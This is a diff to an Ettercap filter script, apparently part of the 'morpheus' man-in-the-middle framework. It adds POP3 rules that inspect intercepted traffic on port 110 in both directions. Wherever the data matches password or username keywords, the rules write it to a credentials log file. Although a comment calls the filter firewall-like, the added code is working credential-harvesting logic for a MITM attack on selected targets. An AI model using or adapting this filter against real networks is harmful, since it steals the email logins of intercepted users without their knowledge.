@@ -16,7 +16,7 @@
 #  This filter will act like a firewall reporting OR blocking connections
 #  inside Local Lan (selected targets), Reports suspicious tcp activity In
 #  the targets selected And also dumps to a logfile logins captured under
-#  mitm + filter execution In services like: http,ssh,smb,telnet,ftp...
+#  mitm + filter execution In services like: http,ssh,smb,telnet,ftp,pop3...
 #  Repors the existence of bootnet connections And reports DHCP requests. 
 ##
 
@@ -111,6 +111,33 @@ if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 80) {
           msg("[morpheus] | status: HTTP login detected!");
           msg("[morpheus] |  info : credentials found, log stored ✔");
           msg("[morpheus] |_ log  : morpheus/logs/http_creds.log!\n");
+        }
+        }
+        }
+}
+if (ip.src == 'TaRONE' && ip.proto == TCP && tcp.dst == 110) {
+  msg("[morpheus] host:TaRONE   [ -> ]  port:110 pop3 ☆");
+        # log credentials into morpheus/logs/pop3_creds.log
+        if (regex(DECODED.data, ".*password.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
+        }else{
+        if (regex(DECODED.data, ".*PASSWORD.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
+        }else{
+        if (regex(DECODED.data, ".*PASS.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
         }
         }
         }
@@ -353,6 +380,57 @@ if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 80) {
           msg("[morpheus] | status: HTTP login detected!");
           msg("[morpheus] |  info : credentials found, log stored ✔");
           msg("[morpheus] |_ log  : morpheus/logs/http_creds.log!\n");
+        }
+        }
+        }
+        }
+        }
+        }
+}
+if (ip.dst == 'TaRONE' && ip.proto == TCP && tcp.src == 110) {
+  msg("[morpheus] host:TaRONE   [ -> ]  port:110 pop3 ☆");
+        # log credentials into morpheus/logs/pop3_creds.log
+        if (regex(DECODED.data, ".*password.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
+        }else{
+        if (regex(DECODED.data, ".*PASSWORD.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
+        }else{
+        if (regex(DECODED.data, ".*PASS.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE   [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
+       }else{
+        if (regex(DECODED.data, ".*user.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE  [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
+        }else{
+        if (regex(DECODED.data, ".*USER.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE  [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
+        }else{
+        if (regex(DECODED.data, ".*USERNAME.*")) {
+         log(DECODED.data, "./pop3_creds.log");
+          msg("\n[morpheus] host:TaRONE  [ ⊶  ]  found...");
+          msg("[morpheus] | status: POP3 login detected!");
+          msg("[morpheus] |  info : credentials found, log stored ✔");
+          msg("[morpheus] |_ log  : morpheus/logs/pop3_creds.log!\n");
         }
         }
         }
